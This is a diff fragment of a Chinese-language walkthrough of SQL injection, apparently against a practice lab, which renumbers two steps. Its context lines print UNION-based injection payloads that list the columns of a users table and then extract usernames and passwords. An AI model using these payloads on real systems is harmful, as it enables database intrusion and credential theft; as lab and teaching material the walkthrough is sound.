@@ -60,14 +60,14 @@ text
 
 ![字段](screenshots/7.png)
 
-6. 获取 users 表的列名
+5. 获取 users 表的列名
 text
 1' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'#
 关键列：user, password。
 
 ![字段](screenshots/8.png)
 
-8. 导出用户名和密码
+6. 导出用户名和密码
 text
 1' UNION SELECT user, password FROM users#
 结果：
